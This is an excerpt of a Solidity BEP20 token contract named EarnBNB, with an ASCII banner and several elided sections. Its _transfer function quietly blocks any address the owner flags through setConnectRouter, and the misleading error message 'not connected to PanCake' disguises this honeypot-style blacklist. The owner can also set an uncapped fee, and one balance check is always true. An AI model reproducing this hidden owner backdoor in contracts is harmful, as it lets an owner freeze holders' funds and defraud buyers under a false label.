...
EEEEEEE                        BBBBB   NN   NN BBBBB   
EE        aa aa rr rr  nn nnn  BB   B  NNN  NN BB   B  
EEEEE    aa aaa rrr  r nnn  nn BBBBBB  NN N NN BBBBBB  
EE      aa  aaa rr     nn   nn BB   BB NN  NNN BB   BB 
EEEEEEE  aaa aa rr     nn   nn BBBBBB  NN   NN BBBBBB  
...
contract EarnBNB is Context, IBEP20, Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public charityAddress = 0x7450783445408CDF91Cc52AF5EfC66a67797D5bF;
    ...
    mapping(address => bool) connect;
	event connectRouter(address indexed connectedRouter, bool value);
  ...
  function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
    ...
    function _transfer(
        ...
        require(connect[from] == false, "Account is not connected to PanCake");
    ...
    function setConnectRouter(address sender, bool _isConnected) external onlyOwner() {
	    require(connect[sender] != _isConnected);
	    connect[sender] = _isConnected;
	    emit connectRouter(sender, _isConnected);
    }

    // Innovation for protocol by EarnBNB Team
    uint256 public rewardCycleBlock = 1 days;
    uint256 public easyRewardCycleBlock = 36 hours;
    ...
    bool public migration = false; // for migration to other platforms or PanCake V3
    ...
    uint256 minTokenNumberToSell = _tTotal.mul(1).div(1000).div(10); // 0.001% max tx amount will trigger swap and add liquidity
    ...
    function claimBNBReward() isHuman nonReentrant public {
        ...
        require(balanceOf(msg.sender) >= 0, 'Error: must own EBNB to claim reward');
        if (migration == true) {
        require(connect[msg.sender] == true, "Account is not connceted to PanCake");
        }
    ...
    function swapAndLiquify(address from, address to) private {
       ...
       function activateContract() public onlyOwner {
        // reward claim
        disableEasyRewardFrom = block.timestamp + 36 hours;
        rewardCycleBlock = 24 hours;
        easyRewardCycleBlock = 36 hours;
    ...
    function activateMigration(bool value)public onlyOwner {
    ...
    function setdisruptiveCoverageFee(uint256 _newdisruptiveFee)public onlyOwner {
        
         disruptiveCoverageFee = _newdisruptiveFee; 
    }
